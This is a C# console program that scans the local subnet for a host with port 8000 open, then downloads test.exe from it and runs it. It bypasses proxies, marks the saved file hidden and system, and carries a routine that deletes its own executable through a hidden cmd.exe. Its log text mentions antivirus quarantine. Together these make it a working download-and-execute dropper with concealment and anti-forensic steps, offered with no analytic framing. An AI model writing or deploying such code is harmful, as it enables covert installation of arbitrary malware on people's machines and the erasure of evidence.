using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace App
{
    // --- New Logger Class ---
    public static class Logger
    {
        private static string _logFilePath;
        private static object _lock = new object();
        private static bool _initialized = false;

        public static void Initialize(string baseDirectory)
        {
            if (_initialized) return;

            _logFilePath = Path.Combine(baseDirectory, $"AppLog_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
            _initialized = true;
            Log("Logger initialized. Log file: " + _logFilePath);
        }

        public static void Log(string message)
        {
            string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            Console.WriteLine(logEntry); // Always write to console

            if (_initialized)
            {
                lock (_lock)
                {
                    try
                    {
                        File.AppendAllText(_logFilePath, logEntry + Environment.NewLine);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[LOGGER ERROR] Failed to write to log file: {ex.Message}");
                    }
                }
            }
        }
    }
    // --- End New Logger Class ---


    internal class Program
    {
        private const int TargetPort = 8000;
        private const int ScanTimeoutMs = 100; // Timeout for each port scan attempt (milliseconds)
        private const int MaxParallelScans = 50; // Limit concurrent scanning tasks to avoid overwhelming the network
        private static bool serverFoundAndDownloaded = false; // Flag to stop scanning once successful

        // New helper to get the local IP address
        private static IPAddress GetLocalIPAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Consider only active Ethernet or Wi-Fi interfaces
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                {
                    foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork) // IPv4
                        {
                            return ip.Address;
                        }
                    }
                }
            }
            return null; // No suitable IP found
        }

        private static async Task<string> FindServerIpAsync() // No longer takes ipRangeStart/End as args
        {
            Logger.Log("Attempting to determine local IP range for scanning...");
            IPAddress localIp = GetLocalIPAddress();

            if (localIp == null)
            {
                Logger.Log("Could not determine local IP address. Cannot scan local network.");
                Logger.Log("Please ensure network connection is active.");
                return null;
            }

            Logger.Log($"Local IP detected: {localIp}");
            byte[] ipBytes = localIp.GetAddressBytes();

            // Construct a Class C subnet range based on the local IP (e.g., 192.168.1.x)
            // This assumes a /24 subnet mask.
            string ipRangeStart = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.1";
            string ipRangeEnd = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.254";

            Logger.Log($"Scanning local IP range {ipRangeStart} - {ipRangeEnd} for open port {TargetPort}...");

            List<Task<string>> scanTasks = new List<Task<string>>();
            SemaphoreSlim semaphore = new SemaphoreSlim(MaxParallelScans);

            for (int i = 1; i <= 254; i++) // Iterate from .1 to .254
            {
                if (serverFoundAndDownloaded) break; // Stop scanning if server is found

                string currentIp = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{i}";

                await semaphore.WaitAsync();
                scanTasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        if (serverFoundAndDownloaded) return null;

                        // Logger.Log($"Checking {currentIp}:{TargetPort}..."); // Can be noisy
                        using (var client = new TcpClient())
                        {
                            var connectTask = client.ConnectAsync(IPAddress.Parse(currentIp), TargetPort);
                            var completedTask = await Task.WhenAny(connectTask, Task.Delay(ScanTimeoutMs));

                            if (completedTask == connectTask && client.Connected)
                            {
                                Logger.Log($"[FOUND] Open port {TargetPort} at {currentIp}");
                                return currentIp;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Specific errors like "No connection could be made because the target machine actively refused it" are normal for closed ports
                        // Logger.Log($"Error checking {currentIp}: {ex.Message}"); 
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                    return null;
                }));
            }

            // Wait for any task to find a server or all tasks to complete
            while (scanTasks.Any() && !serverFoundAndDownloaded)
            {
                var completedTask = await Task.WhenAny(scanTasks);
                scanTasks.Remove(completedTask);

                string foundIp = await completedTask;
                if (!string.IsNullOrEmpty(foundIp))
                {
                    serverFoundAndDownloaded = true;
                    return foundIp;
                }
            }

            Logger.Log("Server not found within the local IP range.");
            return null;
        }


        private static void DownloadAndRunFile(string download_url, string save_path)
        {
            Logger.Log($"Attempting download: {download_url} -> {save_path}");

            try
            {
                string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (!Directory.Exists(destDir))
                    Directory.CreateDirectory(destDir);

                if (File.Exists(save_path))
                {
                    try
                    {
                        File.SetAttributes(save_path, FileAttributes.Normal);
                        File.Delete(save_path);
                        Logger.Log("Deleted existing file at destination.");
                    }
                    catch (Exception delEx)
                    {
                        Logger.Log("Warning: could not delete existing file: " + delEx.Message);
                    }
                }

                using (var client = new WebClient())
                {
                    client.Proxy = null;
                    client.DownloadFile(download_url, save_path);
                }

                Logger.Log("Download succeeded with WebClient.");
                Logger.Log("Saved file location: " + save_path);

                try
                {
                    File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
                }
                catch (Exception attrEx)
                {
                    Logger.Log("Could not set attributes: " + attrEx.Message);
                }

                try
                {
                    Logger.Log("Starting downloaded file...");
                    Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
                }
                catch (Exception startEx)
                {
                    Logger.Log("Failed to start the downloaded file: " + startEx.Message);
                }
            }
            catch (Exception exWebClient)
            {
                Logger.Log("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
                Logger.Log("Trying HttpWebRequest fallback...");

                try
                {
                    var req = (HttpWebRequest)WebRequest.Create(download_url);
                    req.Proxy = null;
                    using (var resp = (HttpWebResponse)req.GetResponse())
                    using (var stream = resp.GetResponseStream())
                    using (var fs = new FileStream(save_path, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }

                    Logger.Log("Download succeeded with HttpWebRequest fallback.");
                    Logger.Log("Saved file location: " + save_path);

                    try
                    {
                        File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception attrEx2)
                    {
                        Logger.Log("Could not set attributes: " + attrEx2.Message);
                    }

                    try
                    {
                        Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
                    }
                    catch (Exception startEx2)
                    {
                        Logger.Log("Failed to start the downloaded file: " + startEx2.Message);
                    }
                }
                catch (Exception exFallback)
                {
                    Logger.Log("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
                    Logger.Log("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
                }
            }
        }

        private static void SelfDelete()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" +
                                new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).FullName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch (Exception ex)
            {
                Logger.Log($"Self-delete failed: {ex.Message}");
            }
        }

        static async Task Main() // Still async Task Main
        {
            // --- Initialize the Logger first ---
            Logger.Initialize(AppContext.BaseDirectory);
            Logger.Log("Application started.");
            // -----------------------------------

            // The IP range is now determined dynamically
            string foundServerIp = await FindServerIpAsync();

            if (!string.IsNullOrEmpty(foundServerIp))
            {
                string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
                string savePath = Path.Combine(AppContext.BaseDirectory, "test.exe");
                DownloadAndRunFile(downloadUrl, savePath);
            }
            else
            {
                Logger.Log("Could not find an accessible server for test.exe on the local network.");
            }

            Logger.Log("Finished. Press Enter to exit.");
            // Console.ReadLine() is still useful for interactive debugging, but won't be logged by the Logger directly
            Console.ReadLine();
        }
    }
}